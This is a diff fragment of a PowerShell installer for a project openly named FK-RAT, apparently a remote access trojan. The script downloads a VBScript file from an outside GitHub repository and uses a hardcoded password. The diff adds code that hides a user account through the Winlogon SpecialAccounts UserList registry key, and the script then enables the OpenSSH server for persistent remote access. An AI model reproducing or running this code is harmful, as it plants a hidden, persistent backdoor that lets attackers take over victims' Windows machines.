@@ -30,7 +30,7 @@ $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
 $regName = randomText
 $vbsName = randomText
 
-$location = Get-Location
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
 ## goto Temp and start 
 Set-Location $temp	
@@ -48,7 +48,8 @@ Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/f
 Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/confirm.vbs -OutFile "$vbsName.vbs"
 
 # install the registry
-Start-Process ./"$regName.reg";"$vbsName.vbs"
+New-Item -Path $regPath -Force
+New-ItemProperty -Path $regPath -Name $uName -Value 00000000
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
